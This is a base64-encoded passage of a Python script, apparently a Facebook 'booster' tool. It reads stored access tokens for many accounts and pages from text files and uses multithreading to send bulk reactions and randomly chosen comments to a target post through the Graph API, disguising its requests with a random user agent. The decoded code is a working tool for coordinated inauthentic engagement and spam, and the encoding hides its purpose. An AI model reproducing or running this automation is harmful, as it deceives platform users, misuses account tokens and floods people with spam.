pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBmb3IgcmVhY3Rpb25zLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDU6IENoZWNrIGlmIHRoZSByZXF1ZXN0ZWQgbnVtYmVyIG9mIHJlYWN0aW9ucyBleGNlZWRzIHRoZSBhdmFpbGFibGUgdG9rZW5zCiAgICBpZiBudW1fcmVhY3Rpb25zID4gbGVuKHRva2Vucyk6CiAgICAgICAgcHJpbnQoZiJ7cmVkfUVOVEVSIEFHQUlOIE5PVCBleGNlZWRpbmcge2xlbih0b2tlbnMpfSIpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDY6IFBlcmZvcm0gcmVhY3Rpb25zIHVzaW5nIG11bHRpdGhyZWFkaW5nCiAgICByZWFjdGlvbnNfY291bnQgPSAwCiAgICBtYXhfd29ya2VycyA9IDEwICAjIFNldCBtYXhpbXVtIG51bWJlciBvZiB0aHJlYWRzCiAgICByZXN1bHRzID0gW10gIAoKICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPW1heF93b3JrZXJzKSBhcyBleGVjdXRvcjoKICAgICAgICAjIFN1Ym1pdCByZWFjdGlvbnMgZm9yIGVhY2ggdG9rZW4KICAgICAgICBmdXR1cmVfdG9fdG9rZW4gPSB7ZXhlY3V0b3Iuc3VibWl0KHBlcmZvcm1fcmVhY3Rpb24sIHRva2VuLCB1aWRfdXJsLCByZWFjdGlvbl90eXBlKTogdG9rZW4gZm9yIHRva2VuIGluIHRva2Vuc1s6bnVtX3JlYWN0aW9uc119CgogICAgICAgICMgUHJvY2VzcyB0aGUgcmVhY3Rpb25zCiAgICAgICAgd2hpbGUgcmVhY3Rpb25zX2NvdW50IDwgbnVtX3JlYWN0aW9uczoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBhc19jb21wbGV0ZWQoZnV0dXJlX3RvX3Rva2VuKToKICAgICAgICAgICAgICAgIHRva2VuID0gZnV0dXJlX3RvX3Rva2VuW2Z1dHVyZV0KICAgICAgICAgICAgICAgIHVpZCA9IHRva2VuLnNwbGl0KCd8JylbMF0KICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4sIHN0YXR1c19jb2RlLCByZXNwb25zZV90ZXh0ID0gZnV0dXJlLnJlc3VsdCgpCiAgICAgICAgICAgICAgICAgICAgaWYgc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICByZWFjdGlvbnNfY291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAgICAge3JlZH1bUkVBQ1RPUl0ge3llbGxvd317dWlkfSAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSAPiB7Z3JlZW59U1VDQ0VTU0ZVTExZIFJFQUNURUQhIikKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgIyBJZiB0aGUgZGVzaXJlZCBudW1iZXIgb2Ygc3VjY2Vzc2Z1bCByZWFjdGlvbnMgaXMgYWNoaWV2ZWQsIGJyZWFrIHRoZSBsb29wCiAgICAgICAgICAgICAgICAgICAgaWYgcmVhY3Rpb25zX2NvdW50ID49IG51bV9yZWFjdGlvbnM6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXG57Z3JlZW59U3VjY2Vzc2Z1bGx5IHJlYWNoZWQge3JlYWN0aW9uc19jb3VudH0gcmVhY3Rpb25zISBFeGl0aW5nLi4uIikKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICAjIEV4aXQgdGhlIGZ1bmN0aW9uIGFmdGVyIHJlYWNoaW5nIHRoZSBkZXNpcmVkIGNvdW50CiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJFcnJvciBwcm9jZXNzaW5nIHRva2VuIHt0b2tlbn06IHtlfSIpCiAgICAgICAgICAgIAogICAgICAgICAgICAjIElmIHRoZXJlIGFyZSBzdGlsbCByZW1haW5pbmcgcmVhY3Rpb25zIHRvIHBlcmZvcm0sIHN1Ym1pdCBtb3JlIHRhc2tzIGZyb20gdGhlIHJlbWFpbmluZyB0b2tlbnMKICAgICAgICAgICAgcmVtYWluaW5nX3Rva2VucyA9IHRva2Vuc1tudW1fcmVhY3Rpb25zOiBudW1fcmVhY3Rpb25zICsgNV0gICMgU3VibWl0IDUgbW9yZSB0YXNrcyBhdCBhIHRpbWUgaWYgbmVlZGVkCiAgICAgICAgICAgIGlmIHJlbWFpbmluZ190b2tlbnM6CiAgICAgICAgICAgICAgICBmdXR1cmVfdG9fdG9rZW4gPSB7ZXhlY3V0b3Iuc3VibWl0KHBlcmZvcm1fcmVhY3Rpb24sIHRva2VuLCB1aWRfdXJsLCByZWFjdGlvbl90eXBlKTogdG9rZW4gZm9yIHRva2VuIGluIHJlbWFpbmluZ190b2tlbnN9CiAgICBwcmludChmIntibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZiJ7Z3JlZW59VE9UQUw6IHtyZWFjdGlvbnNfY291bnR9IikKCgoKaW1wb3J0IHJhbmRvbQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRpbWUKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciwgYXNfY29tcGxldGVkCgpkZWYgcmVwKHBvc3RfaWQsIGNvbW1lbnQsIGFjY2Vzc190b2tlbik6CiAgICAiIiJDb21tZW50IG9uIGEgRmFjZWJvb2sgcG9zdCB1c2luZyB0aGUgcHJvdmlkZWQgYWNjZXNzIHRva2VuLiIiIgogICAgCiAgICAjIFNwbGl0IHRoZSB0b2tlbiBpbiBjYXNlIGl0IGluY2x1ZGVzICd1aWR8YWNjZXNzX3Rva2VuJyBmb3JtYXQKICAgIGlmICd8JyBpbiBhY2Nlc3NfdG9rZW46CiAgICAgICAgXywgYWNjZXNzX3Rva2VuID0gYWNjZXNzX3Rva2VuLnNwbGl0KCd8JywgMSkKICAgIAogICAgIyBOb3cgY2hlY2sgaWYgdGhlIHRva2VuIHN0YXJ0cyB3aXRoICdFQScgb3IgJ0VBQScKICAgIGlmIG5vdCBhY2Nlc3NfdG9rZW4uc3RhcnRzd2l0aCgoIkVBIiwgIkVBQSIpKToKICAgICAgICByZXR1cm4gZiJJbnZhbGlkIHRva2VuOiB7YWNjZXNzX3Rva2VufSIKICAgIAogICAgdHJ5OgogICAgICAgIGNvbnZlcnRlZF9saW5rID0gcG9zdF9pZAogICAgICAgIGF1dG9fY29tbWVudF91cmwgPSBmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxMy4wL3tjb252ZXJ0ZWRfbGlua30vY29tbWVudHMnCiAgICAgICAgcGFyYW1zID0gewogICAgICAgICAgICAnbWVzc2FnZSc6IGNvbW1lbnQsCiAgICAgICAgICAgICdhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4KICAgICAgICB9CiAgICAgICAgdGltZS5zbGVlcCgxKSAgIyBTbGVlcCBmb3IgMSBzZWNvbmQgYmV0d2VlbiBjb21tZW50cwogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICd1c2VyLWFnZW50JzogV191ZXJhZ250KCkgICMgVXNlIHRoZSByYW5kb20gdXNlciBhZ2VudAogICAgICAgIH0KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoYXV0b19jb21tZW50X3VybCwgcGFyYW1zPXBhcmFtcywgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIAogICAgICAgICMgUHJpbnQgc3RhdHVzIGNvZGUgYW5kIHJlc3BvbnNlIGZvciBkZWJ1Z2dpbmcKCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICByZXR1cm4gZiJcMDMzWzE7MzFtW1NVQ0NFU1NdXDAzM1sxOzMxbSBcMDMzWzE7MzJtU1VDQ0VTU0ZVTExZIENPTU1FTlRFRDoge2dyZWVufXtjb21tZW50fVwwMzNbMTszMm0iCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIGYiXDAzM1sxOzMxbVtGQUlMRURdXDAzM1sxOzMxbSBGQUlMRUQgVE8gQ09NTUVOVDoge2dyZWVufXtjb21tZW50fSAiCgogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiBmIlJlcXVlc3QgZmFpbGVkOiB7c3RyKGUpfSIKCgpkZWYgcmVwbHkoKToKICAgICIiIlBlcmZvcm0gY29tbWVudHMgYmFzZWQgb24gdXNlciBpbnB1dCBmb3IgZmlsZSBjaG9pY2UsIHN0YXJ0aW5nIGxpbmUsIHBvc3QgbGluaywgYW5kIG51bWJlciBvZiBjb21tZW50cy4iIiIKICAgIAogICAgIyBTdGVwIDE6IEFzayB0aGUgdXNlciB3aGljaCBmaWxlIHRvIHVzZQogICAgZmlsZV9vcHRpb25zID0gewogICAgICAgIDE6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQiLAogICAgICAgIDI6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBUEFHRVMudHh0IiwKICAgICAgICAzOiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0IiwKICAgICAgICA0OiAiL3NkY2FyZC9ib29zdHBoZXJlL1JQV1BBR0VTLnR4dCIKICAgIH0KICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICB7d2hpdGV9Q0hPT1NFIFRZUEUgT0YgUkVBQ1RPUlM6IAogICAgIHt5ZWxsb3d9WzFdIHtncmVlbn1GUkEgQUNDT1VOVCAKICAgICB7eWVsbG93fVsyXSB7Z3JlZW59RlJBIFBBR0VTCiAgICAge3llbGxvd31bM10ge2dyZWVufVJQVyBBQ0NPVU5UCiAgICAge3llbGxvd31bNF0ge2dyZWVufVJQVyBQQUdFUwogICAgIHtyZWR9WzBdIHtyZWR9RVhJVCAKICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCiAgICAKICAgIHRyeToKICAgICAgICBmaWxlX2Nob2ljZSA9IGludChpbnB1dChmIiAgICAge2dyZWVufUNob29zZTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgZmlsZV9jaG9pY2Ugbm90IGluIGZpbGVfb3B0aW9uczoKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGZpbGVfcGF0aCA9IGZpbGVfb3B0aW9uc1tmaWxlX2Nob2ljZV0KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0ZXAgMjogTG9hZCB0aGUgdG9rZW5zIGZyb20gdGhlIHNlbGVjdGVkIGZpbGUKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIHRva2VucyA9IFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gZmlsZS5yZWFkbGluZXMoKSBpZiBsaW5lLnN0cmlwKCldICAjIEVuc3VyZSBubyBlbXB0eSBsaW5lcwogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KCJGaWxlIG5vdCBmb3VuZC4iKQogICAgICAgIHJldHVybgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgbG9hZGluZyB0b2tlbnM6IHtlfSIpCiAgICAgICAgcmV0dXJuCgogICAgYXZhaWxhYmxlX3Rva2VucyA9IGxlbih0b2tlbnMpCgogICAgIyBTdGVwIDM6IEFzayB0aGUgdXNlciBmb3IgdGhlIHN0YXJ0aW5nIGxpbmUKICAgIGlmIGF2YWlsYWJsZV90b2tlbnMgPT0gMDoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGF2YWlsYWJsZSBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIHN0YXJ0X2xpbmUgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUVudGVyIHRoZSBzdGFydGluZyBsaW5lIHtyZWR9KDEgdG8ge2F2YWlsYWJsZV90b2tlbnN9KTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgc3RhcnRfbGluZSA8IDEgb3Igc3RhcnRfbGluZSA+IGF2YWlsYWJsZV90b2tlbnM6CiAgICAgICAgICAgIHByaW50KGYiUGxlYXNlIGVudGVyIGEgdmFsaWQgbGluZSBudW1iZXIgYmV0d2VlbiAxIGFuZCB7YXZhaWxhYmxlX3Rva2Vuc30uIikKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIHRva2VucyA9IHRva2Vuc1tzdGFydF9saW5lIC0gMTpdICAjIFVzZSB0b2tlbnMgc3RhcnRpbmcgZnJvbSB0aGUgZ2l2ZW4gbGluZQogICAgCiAgICAjIFN0ZXAgNDogQXNrIGZvciB0aGUgcG9zdCBJRAogICAgYSA9IGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgcG9zdCBJRDogIikKICAgIGIgPSBpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgdGhlIGNvbW1lbnQgSUQ6ICIpCiAgICByZXN1bHQgPSBmInthfV97Yn0iCgogICAgcG9zdF9pZCA9IHJlc3VsdAogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCgogICAgdHJ5OgogICAgICAgIG51bV9jb21tZW50cyA9IGludChpbnB1dChmIiAgICB7cmVkfUVudGVyIHRoZSBudW1iZXIgb2YgY29tbWVudHM6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIG51bV9jb21tZW50cyA8PSAwOgogICAgICAgICAgICBwcmludCgiTnVtYmVyIG9mIGNvbW1lbnRzIG11c3QgYmUgZ3JlYXRlciB0aGFuIDAuIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgY29tbWVudHNfbGlzdCA9IFtdCiAgICBmb3IgaSBpbiByYW5nZShudW1fY29tbWVudHMpOgogICAgICAgIGNvbW1lbnQgPSBpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgY29tbWVudCB7aSArIDF9OiAiKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGNvbW1lbnRzX2xpc3QuYXBwZW5kKGNvbW1lbnQpCgogICAgIyBTdGVwIDY6IEFzayBob3cgbWFueSBhY2NvdW50cyB0byB1c2UgZm9yIGNvbW1lbnRpbmcKICAgIHRyeToKICAgICAgICBudW1fYWNjb3VudHMgPSBpbnQoaW5wdXQoZiIgICB7Z3JlZW59RW50ZXIgdGhlIG51bWJlciBvZiBhY2NvdW50cyB0byB1c2UgZm9yIGNvbW1lbnRpbmcgKDEgdG8ge2xlbih0b2tlbnMpfSk6ICIpKQogICAgICAgIGlmIG51bV9hY2NvdW50cyA+IGxlbih0b2tlbnMpIG9yIG51bV9hY2NvdW50cyA8PSAwOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBiZXR3ZWVuIDEgYW5kIHtsZW4odG9rZW5zKX0uIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDc6IFBlcmZvcm0gY29tbWVudHMgdXNpbmcgbXVsdGl0aHJlYWRpbmcKICAgIHJlc3VsdHMgPSBbXQogICAgY29tbWVudHNfY291bnQgPSAwCiAgICBtYXhfd29ya2VycyA9IDEwICAjIFNldCB0aGUgbWF4aW11bSBudW1iZXIgb2YgdGhyZWFkcwogICAgCiAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz1tYXhfd29ya2VycykgYXMgZXhlY3V0b3I6CiAgICAgICAgZnV0dXJlX3RvX3Rva2VuID0ge30KICAgICAgICBmb3IgaSwgdG9rZW4gaW4gZW51bWVyYXRlKHRva2Vuc1s6bnVtX2FjY291bnRzXSk6CiAgICAgICAgICAgIGNvbW1lbnQgPSByYW5kb20uY2hvaWNlKGNvbW1lbnRzX2xpc3QpICAjIFJhbmRvbWx5IHBpY2sgYSBjb21tZW50CiAgICAgICAgICAgIGZ1dHVyZSA9IGV4ZWN1dG9yLnN1Ym1pdChyZXAsIHBvc3RfaWQsIGNvbW1lbnQsIHRva2VuKQogICAgICAgICAgICBmdXR1cmVfdG9fdG9rZW5bZnV0dXJlXSA9IHRva2VuCgogICAgICAgIGZvciBmdXR1cmUgaW4gYXNfY29tcGxldGVkKGZ1dHVyZV90b190b2tlbik6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IGZ1dHVyZS5yZXN1bHQoKQogICAgICAgICAgICAgICAgcHJpbnQocmVzdWx0KSAgIyBQcmludCB0aGUgcmVzdWx0IG9mIHRoZSBjb21tZW50IGF0dGVtcHQKICAgICAgICAgICAgICAgIGlmICJTVUNDRVNTRlVMTFkiIGluIHJlc3VsdDoKICAgICAgICAgICAgICAgICAgICBjb21tZW50c19jb3VudCArPSAxCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3IgcHJvY2Vzc2luZyB0b2tlbjoge2V9IikKCiAgICBwcmludChmIlRvdGFsIGNvbW1lbnRzIG1hZGU6IHtjb21tZW50c19jb3VudH0iKQoKZGVmIGNvbW1lbnRfd2l0aF90b2tlbihwb3N0X2lkLCBjb21tZW50LCBhY2Nlc3NfdG9rZW4pOgogICAgIiIiQ29tbWVudCBvbiBhIEZhY2Vib29rIHBvc3QgdXNpbmcgdGhlIHByb3ZpZGVkIGFjY2VzcyB0b2tlbi4iIiIKICAgIAogICAgIyBTcGxpdCB0aGUgdG9rZW4gaW4gY2FzZSBpdCBpbmNsdWRlcyAndWlkfGFjY2Vzc190b2tlbicgZm9ybWF0CiAgICBpZiAnfCcgaW4gYWNjZXNzX3Rva2VuOgogICAgICAgIF8sIGFjY2Vzc190b2tlbiA9IGFjY2Vzc190b2tlbi5zcGxpdCgnfCcsIDEpCiAgICAKICAgICMgTm93IGNoZWNrIGlmIHRoZSB0b2tlbiBzdGFydHMgd2l0aCAnRUEnIG9yICdFQUEnCiAgICBpZiBub3QgYWNjZXNzX3Rva2VuLnN0YXJ0c3dpdGgoKCJFQSIsICJFQUEiKSk6CiAgICAgICAgcmV0dXJuIGYiSW52YWxpZCB0b2tlbjoge2FjY2Vzc190b2tlbn0iCiAgICAKICAgIHRyeToKICAgICAgICBjb252ZXJ0ZWRfbGluayA9IHBvc3RfaWQKICAgICAgICBhdXRvX2NvbW1lbnRfdXJsID0gZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTMuMC97Y29udmVydGVkX2xpbmt9L2NvbW1lbnRzJwogICAgICAgIHBhcmFtcyA9IHsKICAgICAgICAgICAgJ21lc3NhZ2UnOiBjb21tZW50LAogICAgICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuCiAgICAgICAgfQogICAgICAgIHRpbWUuc2xlZXAoMSkgICMgU2xlZXAgZm9yIDEgc2Vjb25kIGJldHdlZW4gY29tbWVudHMKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAndXNlci1hZ2VudCc6IFdfdWVyYWdudCgpICAjIFVzZSB0aGUgcmFuZG9tIHVzZXIgYWdlbnQKICAgICAgICB9CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGF1dG9fY29tbWVudF91cmwsIHBhcmFtcz1wYXJhbXMsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAKICAgICAgICAjIFByaW50IHN0YXR1cyBjb2RlIGFuZCByZXNwb25zZSBmb3IgZGVidWdnaW5nCiAgICAgICAgcGFzcwoKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIHJldHVybiBmIlwwMzNbMTszMW1bU1VDQ0VTU11cMDMzWzE7MzFtIFwwMzNbMTszMm1TVUNDRVNTRlVMTFkgQ09NTUVOVEVEOiB7Z3JlZW59e2NvbW1lbnR9XDAzM1sxOzMybSIKICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXNzCgogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKICAgIAoKCmRlZiBwZXJmb3JtX2NvbW1lbnRfZmFzdCgpOgogICAgIiIiUGVyZm9ybSBjb21tZW50cyBiYXNlZCBvbiB1c2VyIGlucHV0IGZvciBmaWxlIGNob2ljZSwgc3RhcnRpbmcgbGluZSwgcG9zdCBsaW5rLCBhbmQgbnVtYmVyIG9mIGNvbW1lbnRzLiIiIgogICAgCiAgICAjIFN0ZXAgMTogQXNrIHRoZSB1c2VyIHdoaWNoIGZpbGUgdG8gdXNlCiAgICBmaWxlX29wdGlvbnMgPSB7CiAgICAgICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAgICAgMjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQiLAogICAgICAgIDM6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQiLAogICAgICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0IgogICAgfQogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiIiIgICAgIHt3aGl0ZX1DSE9PU0UgVFlQRSBPRiBSRUFDVE9SUzogCiAgICAge3llbGxvd31bMV0ge2dyZWVufUZSQSBBQ0NPVU5UIAogICAgIHt5ZWxsb3d9WzJdIHtncmVlbn1GUkEgUEFHRVMKICAgICB7eWVsbG93fVszXSB7Z3JlZW59UlBXIEFDQ09VTlQKICAgICB7eWVsbG93fVs0XSB7Z3JlZW59UlBXIFBBR0VTCiAgICAge3JlZH1bMF0ge3JlZH1FWElUIAogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikKICAgIAogICAgdHJ5OgogICAgICAgIGZpbGVfY2hvaWNlID0gaW50KGlucHV0KGYiICAgICB7Z3JlZW59Q2hvb3NlOiAiKSkKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBpZiBmaWxlX2Nob2ljZSBub3QgaW4gZmlsZV9